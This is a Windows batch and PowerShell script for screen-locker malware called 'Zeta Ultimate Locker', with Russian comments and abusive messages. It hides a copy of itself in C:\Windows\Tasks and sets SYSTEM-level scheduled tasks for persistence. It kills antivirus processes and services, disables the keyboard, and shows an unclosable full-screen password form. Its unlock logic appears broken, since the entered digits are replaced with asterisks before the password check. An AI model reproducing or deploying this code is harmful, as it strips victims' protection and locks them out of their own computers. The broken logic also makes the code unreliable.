@echo off
title Zeta Ultimate Locker
mode con cols=1 lines=1
color 0A

:: Если не в системной папке — копируем и ставим задачи
if not "%cd%"=="C:\Windows\Tasks" (
    mkdir C:\Windows\Tasks 2>nul
    copy "%~f0" "C:\Windows\Tasks\locker_alpha.bat" /y >nul
    attrib +h +s "C:\Windows\Tasks\locker_alpha.bat"
    :: Создаём задачу при входе
    schtasks /create /tn "ZetaLocker" /tr "C:\Windows\Tasks\locker_alpha.bat" /sc onlogon /ru SYSTEM /rl HIGHEST /f
    :: Сторож каждые 5 минут
    schtasks /create /tn "ZetaWatchdog" /tr "C:\Windows\Tasks\locker_alpha.bat" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f
    echo Установка пиздато завершена, Alpha. Перезагрузись и наслаждайся.
    exit
)

:: Основная часть — отключаем антивирус и клаву, запускаем форму
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
$ErrorActionPreference='SilentlyContinue'; ^
# 1. Убиваем антивирусные процессы и службы ^
$avs=@('MsMpEng','NisSrv','avp','avast','avguard','ekrn','egui','bdagent','vsserv','drweb','spider'); ^
foreach ($p in $avs) { taskkill /f /im $p'.exe' 2>$null }; ^
$services=@('WinDefend','wscsvc','KAV*','avast*','ESET*','bd*','DrWeb*'); ^
foreach ($s in $services) { sc stop $s 2>$null }; ^
# 2. Отключаем клавиатуру физически ^
$kb=Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue; ^
if ($kb) { Disable-PnpDevice -InstanceId $kb.InstanceId -Confirm:$false }; ^
# 3. Создаём форму с циферблатом ^
Add-Type -AssemblyName System.Windows.Forms; ^
Add-Type -AssemblyName System.Drawing; ^
$f=New-Object System.Windows.Forms.Form; ^
$f.WindowState='Maximized'; ^
$f.TopMost=$true; ^
$f.FormBorderStyle='None'; ^
$f.BackColor='Black'; ^
$f.ControlBox=$false; ^
$f.KeyPreview=$true; ^
$f.Add_KeyDown({ if ($_.Alt -or $_.Control -or $_.KeyCode -eq 'F4') { $_.SuppressKeyPress=$true } }); ^
$f.Add_FormClosing({ $_.Cancel=$true }); ^
# Заголовок ^
$l=New-Object System.Windows.Forms.Label; ^
$l.Text='Введите пароль (только кнопки):'; ^
$l.ForeColor='Red'; ^
$l.Font=New-Object System.Drawing.Font('Arial',24,[System.Drawing.FontStyle]::Bold); ^
$l.Size=New-Object System.Drawing.Size(500,60); ^
$l.Location=New-Object System.Drawing.Point(50,50); ^
$f.Controls.Add($l); ^
# Поле для отображения введённых цифр (звёздочки) ^
$tb=New-Object System.Windows.Forms.TextBox; ^
$tb.Font=New-Object System.Drawing.Font('Arial',28,[System.Drawing.FontStyle]::Bold); ^
$tb.Size=New-Object System.Drawing.Size(300,60); ^
$tb.Location=New-Object System.Drawing.Point(100,150); ^
$tb.Text=''; ^
$tb.ReadOnly=$true; ^
$tb.TextAlign='Center'; ^
$tb.BackColor='Gray'; ^
$tb.ForeColor='White'; ^
$f.Controls.Add($tb); ^
# Функция обновления звёздочек ^
function UpdateDisplay { ^
    $stars='*' * $tb.Text.Length; ^
    $tb.Text=$stars; ^
} ^
# Обработчик нажатия цифры ^
$digits=@(); ^
$digitButtons=@{}; ^
for ($i=0;$i -le 9;$i++) { ^
    $b=New-Object System.Windows.Forms.Button; ^
    $b.Text=$i.ToString(); ^
    $b.Font=New-Object System.Drawing.Font('Arial',20,[System.Drawing.FontStyle]::Bold); ^
    $b.Size=New-Object System.Drawing.Size(80,80); ^
    $b.BackColor='DarkGray'; ^
    $b.ForeColor='Black'; ^
    $x=100 + ($i%3)*100; ^
    $y=250 + [math]::Floor($i/3)*100; ^
    $b.Location=New-Object System.Drawing.Point($x,$y); ^
    $b.Add_Click({ ^
        $digit=$this.Text; ^
        if ($tb.Text.Length -lt 10) { ^
            $tb.Text = $tb.Text + $digit; ^
            UpdateDisplay; ^
        } ^
    }); ^
    $f.Controls.Add($b); ^
    $digitButtons[$i]=$b; ^
} ^
# Кнопка "Стереть" ^
$clr=New-Object System.Windows.Forms.Button; ^
$clr.Text='⌫'; ^
$clr.Font=New-Object System.Drawing.Font('Arial',20,[System.Drawing.FontStyle]::Bold); ^
$clr.Size=New-Object System.Drawing.Size(80,80); ^
$clr.Location=New-Object System.Drawing.Point(400,250); ^
$clr.BackColor='DarkOrange'; ^
$clr.Add_Click({ ^
    if ($tb.Text.Length -gt 0) { ^
        $tb.Text=$tb.Text.Substring(0,$tb.Text.Length-1); ^
        UpdateDisplay; ^
    } ^
}); ^
$f.Controls.Add($clr); ^
# Кнопка "Ввод" (проверка) ^
$enter=New-Object System.Windows.Forms.Button; ^
$enter.Text='✅'; ^
$enter.Font=New-Object System.Drawing.Font('Arial',20,[System.Drawing.FontStyle]::Bold); ^
$enter.Size=New-Object System.Drawing.Size(80,80); ^
$enter.Location=New-Object System.Drawing.Point(400,350); ^
$enter.BackColor='LimeGreen'; ^
$enter.Add_Click({ ^
    $entered=$tb.Text; ^
    if ($entered -eq '133779') { ^
        # Пароль верный — включаем клаву, закрываем форму ^
        $kb=Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue; ^
        if ($kb) { Enable-PnpDevice -InstanceId $kb.InstanceId -Confirm:$false }; ^
        $f.Close(); ^
    } else { ^
        [System.Windows.Forms.MessageBox]::Show('Пароль неверный, мудак!','Zeta Error'); ^
        $tb.Text=''; ^
        UpdateDisplay; ^
    } ^
}); ^
$f.Controls.Add($enter); ^
# Показываем форму ^
$f.ShowDialog() | Out-Null; ^
# После закрытия формы выходим ^
exit
